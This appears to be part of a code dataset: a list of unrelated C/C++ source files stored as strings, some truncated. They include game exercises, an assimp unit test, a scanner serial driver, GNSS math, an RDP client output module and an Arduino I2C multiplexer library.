(((grid[0][0]==grid[1][1])&&(grid[1][1]==grid[2][2])&&(grid[0][0]!=' '))||((grid[0][2]==grid[1][1])&&(grid[1][1]==grid[2][0])&&(grid[1][1]!= ' ')))\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\tint spaces=0;\r\n\tfor (int i = 0; i<3; i++)\r\n\t{\r\n\t\tfor (int j = 0; j<3; j++)\r\n\t\t{\r\n\t\t\tif (grid[i][j]==' ')\r\n\t\t\t{\r\n\t\t\t\t++spaces;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tif (spaces == 0)\r\n\t{\r\n\t\tdraw = true;\r\n\t\treturn true;\r\n\t}\r\n}\r\n",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2019, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer.\n\n* Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer in the documentation and/or other\nmaterials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\ncontributors may be used to endorse or promote products\nderived from this software without specific prior\nwritten permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n\n#include \"UnitTestPCH.h\"\n#include \"SceneDiffer.h\"\n#include \"AbstractImportExportBase.h\"\n\n#include <assimp/Importer.hpp>\n#include <assimp/postprocess.h>\n\nusing namespace Assimp;\n\nclass utAMFImportExport : public AbstractImportExportBase {\npublic:\n    virtual bool importerTest() {\n        Assimp::Importer importer;\n        const aiScene *scene = importer.ReadFile( ASSIMP_TEST_MODELS_DIR \"/AMF/test1.amf\", aiProcess_ValidateDataStructure );\n        return nullptr != scene;\n    }\n};\n\nTEST_F( utAMFImportExport, importAMFFromFileTest ) {\n    EXPECT_TRUE( importerTest() );\n}\n\n\n\nTEST_F(utAMFImportExport, importAMFWithMatFromFileTest) {\n    Assimp::Importer importer;\n    const aiScene *scene = importer.ReadFile(ASSIMP_TEST_MODELS_DIR \"/AMF/test_with_mat.amf\", aiProcess_ValidateDataStructure);\n    EXPECT_NE(nullptr, scene);\n}\n",
    "#include \"wildcatdevice.h\"\n#include \"SDL_log.h\"\n#include \"helpers.h\"\n#include \"scanner.hpp\"\n#include \"wildcatchannel.h\"\n#include <cassert>\n#include <cstdio>\n#include <fcntl.h>\n#include <termio.h>\n#include <unistd.h>\n\nstd::string\nHelper_MessageTypeToString(WildcatDevice::WildcatMessageType msgType) {\n  switch (msgType) {\n  case WildcatDevice::WildcatMessageType::EnterProgramMode:\n    return \"PRG\";\n  case WildcatDevice::WildcatMessageType::ExitProgramMode:\n    return \"EPG\";\n  case WildcatDevice::WildcatMessageType::GetModelInfo:\n    return \"MDL\";\n  case WildcatDevice::WildcatMessageType::GetFirmwareInfo:\n    return \"VER\";\n  case WildcatDevice::WildcatMessageType::SetBacklight:\n    return \"BLT\";\n  case WildcatDevice::WildcatMessageType::SetBatteryInfo:\n    return \"BSV\";\n  case WildcatDevice::WildcatMessageType::ClearMemory:\n    return \"CLR\";\n  case WildcatDevice::WildcatMessageType::SetBandPlan:\n    return \"BPL\";\n  case WildcatDevice::WildcatMessageType::SetKeyBeep:\n    return \"KBP\";\n  case WildcatDevice::WildcatMessageType::SetPriorityMode:\n    return \"PRI\";\n  case WildcatDevice::WildcatMessageType::SetSCANChannelGroup:\n    return \"SCG\";\n  case WildcatDevice::WildcatMessageType::DeleteChannel:\n    return \"DCH\";\n  case WildcatDevice::WildcatMessageType::SetChannelInfo:\n    return \"CIN\";\n  case WildcatDevice::WildcatMessageType::SetCloseCallSearchSettings:\n    return \"SCO\";\n  case WildcatDevice::WildcatMessageType::SetGlobalLockoutFreq:\n    return \"GLF\";\n  case WildcatDevice::WildcatMessageType::UnlockGlobalLO:\n    return \"ULF\";\n  case WildcatDevice::WildcatMessageType::LockoutFrequency:\n    return \"LOF\";\n  case WildcatDevice::WildcatMessageType::SetCloseCallSettings:\n    return \"CLC\";\n  case WildcatDevice::WildcatMessageType::SetServiceSettings:\n    return \"SSG\";\n  case WildcatDevice::WildcatMessageType::SetCustomSearchGroup:\n    return \"CSG\";\n  case WildcatDevice::WildcatMessageType::SetCustomSearchSettings:\n    return \"CSP\";\n  case WildcatDevice::WildcatMessageType::SetWeatherSettings:\n    return \"WXS\";\n  case WildcatDevice::WildcatMessageType::SetLCDContrastSettings:\n    return \"CNT\";\n  case WildcatDevice::WildcatMessageType::SetVolumeLevel:\n    return \"VOL\";\n  case WildcatDevice::WildcatMessageType::SetSquelchLevelSettings:\n    return \"SQL\";\n  };\n\n  assert(0);\n\n  return \"\";\n}\n\nWildcatDevice::WildcatDevice(int port) : m_port(port) {\n  SDL_Log(\"Connecting to scanner on port %i\", port);\n\n  m_devicePath = std::filesystem::path(\"/dev/ttyACM\" + std::to_string(port));\n\n  SDL_Log(\"Scanner device path: %s\", m_devicePath.c_str());\n\n  m_device = open(m_devicePath.c_str(), O_RDWR | O_NOCTTY | O_SYNC);\n\n  SDL_Log(\"File descriptor: %i\", m_device);\n\n  if (m_device < 0) {\n    if (!std::filesystem::exists(m_devicePath)) {\n      Helper_ErrorMsg(\"No scanner device connected on port \" +\n                      std::to_string(port) +\n                      \"!\\nMake sure your \"\n                      \"device is plugged in and turned on\");\n    } else {\n      Helper_ErrorMsg(\"Failed to open serial device from: \" +\n                      m_devicePath.generic_string() +\n                      \"\\nMake sure you are in the 'dialout' group\");\n    }\n\n    std::exit(EXIT_FAILURE);\n  }\n\n  setInterfaceAttributes(m_device, SCANNER_SPEED, 0);\n  setBlocking(m_device);\n\n  SDL_Log(\"Querying scanner hardware information...\");\n\n  std::vector<std::string> model = writeToDevice3(\n      Helper_MessageTypeToString(WildcatMessageType::GetModelInfo));\n  std::vector<std::string> firmware = writeToDevice3(\n      Helper_MessageTypeToString(WildcatMessageType::GetFirmwareInfo));\n\n  m_devInfo.model = model[0];\n  m_devInfo.firmware = firmware[0];\n}\n\nint WildcatDevice::setInterfaceAttributes(int fd, int speed, int parity) {\n  // Thanks to:\n  // https://stackoverflow.com/questions/6947413/how-to-open-read-and-write-from-serial-port-in-c\n\n  struct termios tty;\n  if (tcgetattr(fd, &tty) != 0) {\n    SDL_Log(\"tcgetattr(...): %s\", strerror(errno));\n\n    Helper_ErrorMsg(\"Failed to set interface attributes on serial device\");\n\n    return -1;\n  }\n\n  cfsetospeed(&tty, speed);\n  cfsetispeed(&tty, speed);\n\n  tty.c_cflag = (tty.c_cflag & ~CSIZE) | CS8; // 8-bit chars\n  tty.c_iflag &= ~IGNBRK;\n  tty.c_lflag = 0;\n  tty.c_oflag = 0;\n  tty.c_cc[VMIN] = 0;\n  tty.c_cc[VTIME] = 5;\n\n  tty.c_iflag &= ~(IXON | IXOFF | IXANY);\n\n  tty.c_cflag |= (CLOCAL | CREAD);\n  tty.c_cflag &= ~(PARENB | PARODD);\n  tty.c_cflag |= parity;\n  tty.c_cflag &= ~CSTOPB;\n  tty.c_cflag &= ~CRTSCTS;\n\n  if (tcsetattr(fd, TCSANOW, &tty) != 0) {\n    SDL_Log(\"tcsetattr(...): %s\", strerror(errno));\n\n    Helper_ErrorMsg(\"Failed to set interface attributes on serial device (2)\");\n    return -1;\n  }\n\n  return 0;\n}\n\nvoid WildcatDevice::setBlocking(int file, bool blocking) {\n  struct termios serial;\n\n  memset(&serial, 0, sizeof(serial));\n\n  if (tcgetattr(file, &serial) != 0) {\n    SDL_Log(\"tcgetattr(...): %s\", strerror(errno));\n\n    Helper_ErrorMsg(\"Failed to set blocking on serial device\");\n\n    std::exit(-1);\n  }\n\n  seria",
    "// Section 8 Challenge\n/*\n\tFor this program I will be using US dollars and cents.\n\t\n    Write a program that asks the user to enter the following:\n\tAn integer representing the number of cents \n    \t\n\tYou may assume that the number of cents entered is greater than or equal to zero\n    \n\tThe program should then display how to provide that change to the user.\n\t\n\tIn the US:\n\t\t1 dollar is 100 cents\n\t\t1 quarter is 25 cents\n\t\t1 dime is 10 cents\n\t\t1 nickel is 5 cents, and\n\t\t1 penny is 1 cent.\n\t\t\n\tHere is a sample run:\n\t\n\tEnter an amount in cents :  92\n\t\n\tYou can provide this change as follows:\n\tdollars    : 0\n\tquarters : 3\n\tdimes     : 1\n\tnickels   : 1\n\tpennies  : 2\n\t\n\tFeel free to use your own currency system.\n\tAlso, think of how you might solve the problem using the modulo operator.\n\n\tHave fun and test your program!!\n*/\n\n#include <iostream>\n\nint main() {\n\n    std::cout << \"Enter an amount in cents: \";\n    int cents_amount {0};\n    std::cin >> cents_amount;\n\n    // Calculate the change \n    // - define the conversion rates and variables to store the change\n    const int dollar_to_cents {100};\n    const int quarter_to_cents {25};\n    const int dime_to_cents {10};\n    const int nickel_to_cents {5};\n    const int penny_to_cents {1};\n\n    // int dollar_change {};\n    // int quarter_change {};\n    // int dime_change {};\n    // int nickel_change {};\n    // int penny_change {};\n\n    std::cout << \"\\nYou can provide the change as follows:\" << std::endl;\n    std::cout << \"dollars: \" << cents_amount / dollar_to_cents; // division operator with two integers as operands returns a flor integer\n    cents_amount %= dollar_to_cents;\n    \n    std::cout << \"\\nquarters: \" << cents_amount / quarter_to_cents; // division operator with two integers as operands returns a flor integer\n    cents_amount %= quarter_to_cents;\n\n    std::cout << \"\\ndimes: \" << cents_amount / dime_to_cents; // division operator with two integers as operands returns a flor integer\n    cents_amount %= dime_to_cents;\n\n    std::cout << \"\\nnickels: \" << cents_amount / nickel_to_cents; // division operator with two integers as operands returns a flor integer\n    cents_amount %= nickel_to_cents;\n\n    std::cout << \"\\npennies: \" << cents_amount / penny_to_cents;  \n\n    return 0;\n}",
    "/**\r\n * @file    PseudoRange.cpp\r\n * @brief   Implementation file for PseudoRange\r\n * @author  Clark Taylor\r\n * @date    Jul 2024\r\n **/\r\n\r\n#include \"PseudoRange.h\"\r\n\r\nusing namespace std;\r\n\r\nnamespace gnss_gtsam {\r\n\r\n    namespace prange{ \r\n        double time_divider=1E6;\r\n        double c = 2.99792458E8; // m/s, speed of light\r\n        double c_small = c/time_divider; // speed of light in smaller time units (to make solving more numerically stable)\r\n        double sc_epsilon = 1E-5; // Used to make square root derivatives not blow up\r\n    }\r\n\r\nVector PseudoRange::evaluateError(const Vector4& p, \r\n                                        OptionalMatrixType H) const {\r\n    Vector3 diff_loc = p.head<3>() - sat_pos_;\r\n    double prange_error = diff_loc.norm() + p[3]*prange::c_small - prange_meas_;\r\n    auto normed_diff = diff_loc/diff_loc.norm();\r\n    Vector1 err;\r\n    err[0] = prange_error;\r\n\r\n    if (H) {\r\n        Matrix tmp(1, 5);\r\n        for (int i=0; i<3; i++) \r\n            tmp(0,i) = normed_diff[i];\r\n        tmp(0,3) = prange::c_small;\r\n        tmp(0,4) = 0.0;\r\n        // std::cout << \"tmp created successfully\" << std::endl;\r\n        (*H) = tmp;\r\n    }\r\n    return err;\r\n}\r\n\r\nVector sc_PseudoRange::evaluateError(const Vector4& p, const double& sc,\r\n                                        OptionalMatrixType H_p,\r\n                                        OptionalMatrixType H_sc) const {\r\n    Vector3 diff_loc = p.head<3>() - sat_pos_;\r\n    double uw_error = diff_loc.norm() + p[3]*prange::c_small - prange_meas_; // unweighted error\r\n    auto normed_diff = diff_loc/diff_loc.norm();\r\n\r\n    // I don't know if this is needed or not, but if the switch goes negative, that would\r\n    // throw off the math, so just make sure it doesnt... (while getting the value)\r\n    double orig_switch = std::fmax(0,sc);\r\n    // I do sqrt because I want the switch to scale the squared error, not (possibly negative) error\r\n    double local_switch = std::sqrt(orig_switch);\r\n    double error = uw_error * local_switch;\r\n\r\n    if (H_sc) {\r\n        // Maybe I don't need to, but I am worried about the / orig_switch value (the correct value)\r\n        // being numerically stable as the switch value approaches 0.  So, use the sc_epsilon here.\r\n        Matrix tmp(1,1);\r\n        tmp(0,0) = uw_error * 0.5/(local_switch + prange::sc_epsilon);\r\n        (*H_sc) = tmp;\r\n    }\r\n\r\n    if (H_p) {\r\n        Matrix tmp(1, 5);\r\n        for (int i=0; i<3; i++) \r\n            tmp(0,i) = normed_diff[i];\r\n        tmp(0,3) = prange::c_small;\r\n        tmp(0,4) = 0.0;\r\n        // std::cout << \"tmp created successfully\" << std::endl;\r\n        (*H_p) = tmp * local_switch;\r\n    }\r\n    return (Vector1() << error).finished();\r\n}\r\n\r\n\r\n} //namespace gnss_gtsam",
    "#pragma region MACRO\n#pragma GCC target(\"avx2\")\n#pragma GCC optimize(\"O3\")\n#pragma GCC optimize(\"unroll-loops\")\n#include <bits/stdc++.h>\nusing namespace std;\nusing ll = long long;\nusing ull = unsigned long long;\nusing ld = long double;\nusing vl = vector<ll>;\ntemplate <class T>\nusing vc = vector<T>;\ntemplate <class T>\nusing vvc = vector<vector<T>>;\n\n#define eb emplace_back\n#define all(x) (x).begin(), (x).end()\n#define rep(i, n) for (int i = 0; i < (n); i++)\n#define repr(i, n) for (int i = (n) - 1; i >= 0; i--)\n#define repe(i, l, r) for (int i = (l); i < (r); i++)\n#define reper(i, l, r) for (int i = (r) - 1; i >= (l); i--)\n#define repa(i, n) for (auto &i : n)\n\ntemplate <class T1, class T2>\ninline bool chmax(T1 &a, const T2 &b)\n{\n    if (a < b)\n    {\n        a = b;\n        return 1;\n    }\n    return 0;\n}\ntemplate <class T1, class T2>\ninline bool chmin(T1 &a, const T2 &b)\n{\n    if (b < a)\n    {\n        a = b;\n        return 1;\n    }\n    return 0;\n}\n\nstruct init\n{\n    init()\n    {\n        cin.tie(0);\n        ios::sync_with_stdio(false);\n        cout << fixed << setprecision(15);\n        cerr << fixed << setprecision(15);\n    }\n} init_;\n\ntemplate <typename T, typename U>\nostream &operator<<(ostream &out, const pair<T, U> &a) { return out << a.first << ' ' << a.second; }\ntemplate <typename T>\nostream &operator<<(ostream &out, const vector<T> &a)\n{\n    for (auto it = a.begin(); it != a.end();)\n    {\n        out << *it;\n        if (++it != a.end())\n            out << ' ';\n    }\n    return out;\n}\ntemplate <typename T, size_t N>\nostream &operator<<(ostream &out, const array<T, N> &a)\n{\n    for (auto it = a.begin(); it != a.end();)\n    {\n        out << *it;\n        if (++it != a.end())\n            out << ' ';\n    }\n    return out;\n}\ntemplate <typename T>\nostream &operator<<(ostream &out, const set<T> &a)\n{\n    for (auto it = a.begin(); it != a.end();)\n    {\n        out << *it;\n        if (++it != a.end())\n            out << ' ';\n    }\n    return out;\n}\ntemplate <typename T, typename U>\nostream &operator<<(ostream &out, const map<T, U> &a)\n{\n    for (auto it = a.begin(); it != a.end();)\n    {\n        out << *it;\n        if (++it != a.end())\n            out << '\\n';\n    }\n    return out;\n}\n\n#ifndef DEBUG\ntemplate <class T, class N>\nvoid verr(const vector<T> &a, const N &n)\n{\n    rep(i, n) cerr << a[i] << \" \";\n    cerr << endl;\n}\ntemplate <class T, class N, size_t AN>\nvoid verr(const array<T, AN> &a, const N &n)\n{\n    rep(i, n) cerr << a[i] << \" \";\n    cerr << endl;\n}\nll dbgt = 1;\nvoid err() { cerr << \"passed \" << dbgt++ << endl; }\ntemplate <class H, class... T>\nvoid err(H &&h, T &&...t)\n{\n    cerr << h << (sizeof...(t) ? \" \" : \"\\n\") << flush;\n    if (sizeof...(t) > 0)\n        err(forward<T>(t)...);\n}\n#else\nvoid err() {}\ntemplate <class H, class... T>\nvoid err(H &&h, T &&...t) {}\ntemplate <class H, class... T>\nvoid verr(H &&h, T &&...t) {}\n#endif\n\n// const ll INF = 4e18;\nconst int INF = 1e9;\nconst ld EPS = 1e-11;\nconst ld PI = acos(-1.0L);\n// const ll MOD = 1e9 + 7;\nconst ll MOD = 998244353;\n//--------------------------------------------------------------------------------//\n\ninline uint32_t pcg32()\n{\n    static uint64_t x = 0x0123456789012345u;\n    unsigned count = (unsigned)(x >> 61);\n    x *= 3;\n    x ^= x >> 22;\n    return (uint32_t)(x >> (22 + count));\n}\n#pragma endregion\n\n// \u6642\u9593\u3092\u51fa\u529b\nchrono::system_clock::time_point startTime, endTime;\n\n// \u7d4c\u904e\u6642\u9593(ms) \u3092\u53d6\u5f97\nint get_diff_time()\n{\n    return chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now() - startTime).count();\n}\n\n// [0, a)\u306e\u6574\u6570\u4e71\u6570\ninline int get_randint(int a)\n{\n    return (long long)pcg32() * a >> 32;\n}\n\n// [0, 1]\u306e\u4e71\u6570\ninline double get_randdouble()\n{\n    return pcg32() / (double)numeric_limits<uint32_t>::max();\n}\n\n// \u56fa\u5b9a\u30d1\u30e9\u30e1\u30fc\u30bf\n\n// \u30cf\u30a4\u30d1\u30fc\u30d1\u30e9\u30e1\u30fc\u30bf ---------------------------------\nint ZERO = 0;\ndouble TIME_LIMIT = 1850; // ms\n\nenum hyper_param_idx\n{\n    ZERO_ID,\n};\n\nusing Pair = pair<ll, ll>;\n\nPair add(Pair a, Pair b)\n{\n    return {a.first + b.first, a.second + b.second};\n}\n\nPair sub(Pair a, Pair b)\n{\n    return {a.first - b.first, a.second - b.second};\n}\n\nconst int dx[] = {-1, 0, 1}, dy[] = {-1, 0, 1};\nPair get_differential(int d)\n{\n    assert(0 <= d && d < 9);\n    return {dx[d % 3], dy[d / 3]};\n}\n\nint get_diff_idx(Pair p)\n{\n    assert(-1 <= p.first && p.first <= 1);\n    assert(-1 <= p.second && p.second <= 1);\n    return (p.second + 1) * 3 + (p.first + 1);\n}\n\nvoid solve_greedy(vc<pair<ll, ll>> input)\n{\n    ll N = input.size();\n\n    // const int N = input.size();\n    vector<int> ans;\n    Pair p = {0, 0}, v = {0, 0};\n\n    rep(i, N)\n    {\n        auto calc = [&](ll diff) -> vector<int>\n        {\n            if (diff == 0)\n                return vector<int>(0);\n            const int dist = abs(diff);\n            vector<int> ret;\n            ll ok = 0, ng = 1e6;\n            while (ng - ok > 1)\n            {\n                ll mid = (ok + ng) / 2;\n                ll sum = mid * mid;\n                // err(\"sum\", sum, \"mid\", mid, \"dist\", dist);\n                (sum <= ",
    "/**MOD+**********************************************************************/\r\n/* Module:    orint.cpp                                                     */\r\n/*                                                                          */\r\n/* Purpose:   Output Requestor internal functions                           */\r\n/*                                                                          */\r\n/* Copyright(C) Microsoft Corporation 1997                                  */\r\n/*                                                                          */\r\n/****************************************************************************/\r\n\r\n#include <adcg.h>\r\n\r\nextern \"C\" {\r\n#define TRC_GROUP TRC_GROUP_CORE\r\n#define TRC_FILE  \"worint\"\r\n#include <atrcapi.h>\r\n}\r\n\r\n#include \"autil.h\"\r\n#include \"wui.h\"\r\n#include \"or.h\"\r\n#include \"sl.h\"\r\n\r\n\r\n/**PROC+*********************************************************************/\r\n/* Name:    ORSendRefreshRectanglePDU                                       */\r\n/*                                                                          */\r\n/* Purpose: Builds and sends a RefreshRectanglePDU                          */\r\n/*                                                                          */\r\n/* Returns: Nothing                                                         */\r\n/*                                                                          */\r\n/* Params:  None                                                            */\r\n/*                                                                          */\r\n/**PROC-*********************************************************************/\r\nDCVOID DCINTERNAL COR::ORSendRefreshRectanglePDU(DCVOID)\r\n{\r\n    PTS_REFRESH_RECT_PDU    pSendBuffer;\r\n    SL_BUFHND  bufHandle;\r\n\r\n    DC_BEGIN_FN(\"ORSendRefreshRectanglePDU\");\r\n\r\n    /************************************************************************/\r\n    /* If we can't get a buffer, abandon the send                           */\r\n    /************************************************************************/\r\n    if (!_pSl->SL_GetBuffer(TS_REFRESH_RECT_PDU_SIZE,\r\n                      (PPDCUINT8) &pSendBuffer,\r\n                      &bufHandle))\r\n    {\r\n        TRC_NRM((TB, _T(\"Failed to GetBuffer\")));\r\n        DC_QUIT;\r\n    }\r\n\r\n    TRC_NRM((TB, _T(\"GetBuffer succeeded\")));\r\n\r\n    /************************************************************************/\r\n    /* Fill in the buffer with a RefreshRect PDU                            */\r\n    /************************************************************************/\r\n    DC_MEMSET(pSendBuffer, 0, TS_REFRESH_RECT_PDU_SIZE);\r\n    pSendBuffer->shareDataHeader.shareControlHeader.pduType =\r\n                                    TS_PROTOCOL_VERSION | TS_PDUTYPE_DATAPDU;\r\n    pSendBuffer->shareDataHeader.shareControlHeader.pduSource =\r\n                                                       _pUi->UI_GetClientMCSID();\r\n\r\n    TS_DATAPKT_LEN(pSendBuffer)            = TS_REFRESH_RECT_PDU_SIZE;\r\n    TS_UNCOMP_LEN(pSendBuffer)             = TS_REFRESH_RECT_UNCOMP_LEN;\r\n    pSendBuffer->shareDataHeader.shareID   = _pUi->UI_GetShareID();\r\n    pSendBuffer->shareDataHeader.streamID  = TS_STREAM_LOW;\r\n    pSendBuffer->shareDataHeader.pduType2  = TS_PDUTYPE2_REFRESH_RECT;\r\n\r\n    /************************************************************************/\r\n    /* Set a single rectangle.                                              */\r\n    /************************************************************************/\r\n    pSendBuffer->numberOfAreas = 1;\r\n    RECT_TO_TS_RECTANGLE16(&(pSendBuffer->areaToRefresh[0]),\r\n                           &_OR.invalidRect)\r\n\r\n    /************************************************************************/\r\n    /* Now send the buffer                                                  */\r\n    /************************************************************************/\r\n    _pSl->SL_SendPacket((PDCUINT8)pSendBuffer,\r\n                  TS_REFRESH_RECT_PDU_SIZE,\r\n                  RNS_SEC_ENCRYPT,\r\n                  bufHandle,\r\n                  _pUi->UI_GetClientMCSID(),\r\n                  _pUi->UI_GetChannelID(),\r\n                  TS_HIGHPRIORITY);\r\n\r\n    DC_MEMSET(&_OR.invalidRect, 0, sizeof(RECT));\r\n    _OR.invalidRectEmpty = TRUE;\r\n\r\nDC_EXIT_POINT:\r\n    DC_END_FN();\r\n\r\n    return;\r\n\r\n} /* ORSendRefreshRectanglePDU */\r\n\r\n\r\n/**PROC+*********************************************************************/\r\n/* Name:    ORSendSuppressOutputPDU                                         */\r\n/*                                                                          */\r\n/* Purpose: Builds and sends a SuppressOutputPDU                            */\r\n/*                                                                          */\r\n/* Returns: Nothing                                                         */\r\n/*                                                                          */\r\n/* Params:  None                                                       ",
    "#include \"iostream\"\n#include \"string\"\n#include \"ctime\"\n#include \"cstdlib\"\n#include \"unistd.h\"\nusing namespace std;\n\n//NUMERO YA MENCIONADO POR EL BOT YA NO VOLVERLO A DECIR\n// Prototipo de funci\u00f3n\nbool yaColocado(int, int mat[3][3]);\nbool tableroCompleto(int mat[3][3]);\nvoid marcarNumero(int, int mat[3][3]);\n\nint main(void)\n{\n    srand(time(0));\n    int numAl, opc, opcion;\n    string arrjug[2];\n    bool juegoTerminado = false;\n    int mat[2][3][3] = {0}; // Matrices para los dos jugadores\n\ndo {\ncout << \"Seleccione la opcion que desee: \" << endl;\ncout << \"1. NUEVA PARTIDA\" << endl;     \ncout << \"2. REGISTRO DE PARTIDAS\" << endl; \ncout << \"3. REGISTRO DE GANADORES\" << endl; \ncout << \"4. INTEGRANTES DE MAX\" << endl; \ncout << \"5. SALIR DEL JUEGO\" << endl;\ncin >> opc;\n\n        switch (opc) {\n\n          case 1: \n                for (int i = 0; i < 2; i++) {\n                cout << \"Ingrese el nombre del jugador \" << (i + 1) << \" : \";\n                cin >> arrjug[i];\n            }\n\n            cout << endl << \"Los nombres de los jugadores son: \" << endl;\n            for (int i = 0; i < 2; i++) {\n                cout << \"Jugador \" << (i + 1) << \" : \" << arrjug[i] << endl;\n            }\n\n            cout << endl << endl << \"HAZ INICIADO UNA NUEVA PARTIDA!\" << endl << endl;\n            cout << endl << \"TABLEROS DE JUGADORES\" << endl << endl;\n\n            // Generar y mostrar los tableros para cada jugador\n            for (int k = 0; k < 2; k++) {\n                cout << \"Tablero del jugador \" << arrjug[k] << \" : \" << endl << endl;\n\n                // Generar n\u00fameros aleatorios \u00fanicos para cada tablero\n                for (int i = 0; i < 3; i++) {\n                    for (int j = 0; j < 3; j++) {\n                        do {\n                            numAl = 1 + rand() % 20;\n                        } while (yaColocado(numAl, mat[k]));\n                        mat[k][i][j] = numAl;\n                    }\n                }\n\n                // Mostrar el tablero del jugador\n                for (int i = 0; i < 3; i++) {\n                    for (int j = 0; j < 3; j++) {\n                        cout << mat[k][i][j] << \"  \";\n                    }\n                    cout << endl << endl;\n                }\n\n            }\n\n            // Pausa antes de que el bot comience a generar n\u00fameros\n            cout << \"Presione Enter para que el bot genere el primer numero...\" << endl;\n            cin.ignore(); // Ignorar el car\u00e1cter de nueva l\u00ednea residual del \u00faltimo cin\n            cin.get();\n\n            // Bucle para generar n\u00fameros aleatorios y marcar en los tableros\n            \n            while (!juegoTerminado) { \n                \n                numAl = 1 + rand() % 20;\n                cout << endl << endl << \"Numero generado por el bot: \" << numAl << endl << endl;\n\n                for (int k = 0; k < 2; k++) {\n                    marcarNumero(numAl, mat[k]);\n                }\n\n                // Mostrar los tableros actualizados\n                for (int k = 0; k < 2; k++) {\n                    cout << \"Tablero del jugador \" << arrjug[k] << \" actualizado : \" << endl << endl;\n                    for (int i = 0; i < 3; i++) {\n                        for (int j = 0; j < 3; j++) {\n                            cout << mat[k][i][j] << \"  \";\n                        }\n                        cout << endl << endl;\n                    }\n                }\n\n                        // Pausa entre generaciones de n\u00fameros\n                sleep(1);\n\n                for (int k = 0; k < 2; k++) {\n\n                    if (tableroCompleto(mat[k])) {\n                        cout << endl << \"EL JUGADOR \" << arrjug[k] << \" HA GANADO LA PARTIDA!\" << endl;\n                        juegoTerminado = true;\n\n                        cout << endl << endl << \"LA PARTIDA HA TERMINADO...\" << endl << endl;\n                        break;\n                    }\n                }\n            \n                // do while para que las opciones no se muestren cuando este completo de ceros \n                \n                cout << \"1. Mostrar la ayuda\" << endl;\n                cout << \"2. Continuar con la partida\" << endl;\n                cin >> opcion; \n\n                if(opcion ==1){\n                    cout << \"AYUDA\" << endl;\n                    cout << \"reglas\" << endl; \n                    // Opci\u00f3n para continuar\n                    cout << \"Presione Enter para continuar con la partida...\" << endl;\n                    cin.ignore();\n                    cin.get();\n                    \n                }\n                else if(opcion ==2){\n                    cout <<\" \" << endl; \n                }\n                \n                \n                sleep(1);\n\n            }\n\n                    break;\n\n                    case 2: \n\n                    cout << endl << \" REGISTRO DE PARTIDAS \" << endl << endl;\n            \n                    break; \n\n                    case 3: \n                    cout << endl << \"REGISTRO DE GANADORES\" << endl << endl;\n             ",
    "//\n//    FILE: ADG728.cpp\n//  AUTHOR: Rob Tillaart\n// VERSION: 0.1.0\n//    DATE: 2024-07-03\n// PURPOSE: Arduino Library for I2C ADG728 matrix switch. 1x8 Multiplexer.\n//     URL: https://github.com/RobTillaart/ADG728\n//          https://www.adafruit.com/product/5899\n\n\n#include \"ADG728.h\"\n\n\nADG728::ADG728(uint8_t deviceAddress, TwoWire *wire)\n{\n  _address  = deviceAddress;\n  _wire     = wire;\n  _mask     = 0x00;\n  _resetPin = -1;\n  _forced   = false;\n  _error    = ADG728_OK;\n  _channels = 8;\n}\n\n\nbool ADG728::begin(uint8_t mask)\n{\n  if (! isConnected()) return false;\n  setChannelMask(mask);\n  return true;\n}\n\n\nbool ADG728::isConnected()\n{\n  _wire->beginTransmission(_address);\n  return ( _wire->endTransmission() == 0);\n}\n\n\nuint8_t ADG728::channelCount()\n{\n  return _channels;\n}\n\n\nbool ADG728::enableChannel(uint8_t channel)\n{\n  if (channel >= _channels) return false;\n  return setChannelMask(_mask | (0x01 << channel));\n}\n\n\nbool ADG728::disableChannel(uint8_t channel)\n{\n  if (channel >= _channels) return false;\n  return setChannelMask(_mask & ~(0x01 << channel));\n}\n\n\nbool ADG728::selectChannel(uint8_t channel)\n{\n  if (channel >= _channels) return false;\n  return setChannelMask(0x01 << channel);\n}\n\n\nbool ADG728::isEnabled(uint8_t channel)\n{\n  if (channel >= _channels) return false;\n  return (_mask & (0x01 << channel));\n}\n\n\nbool ADG728::disableAllChannels()\n{\n  return setChannelMask(0x00);\n}\n\n\nbool ADG728::setChannelMask(uint8_t mask)\n{\n  if ((_mask == mask) && (not _forced)) return true;\n  _mask = mask;\n  _wire->beginTransmission(_address);\n  _wire->write(_mask);\n  _error = _wire->endTransmission();\n  return (_error == 0);\n}\n\n\nuint8_t ADG728::getChannelMask()\n{\n  if (_forced)  //  read from device.\n  {\n    _wire->requestFrom(_address, (uint8_t)1);\n    _mask = _wire->read();\n  }\n  return _mask;\n}\n\n\nvoid ADG728::setResetPin(uint8_t resetPin)\n{\n  _resetPin = resetPin;\n  pinMode(_resetPin, OUTPUT);\n  digitalWrite(_resetPin, HIGH);  //  page 3 HIGH is normal operation\n}\n\n\nvoid ADG728::reset()\n{\n  if (_resetPin != -1)\n  {\n    digitalWrite(_resetPin, LOW);\n    delayMicroseconds(1);\n    digitalWrite(_resetPin, HIGH);\n  }\n}\n\n\nvoid 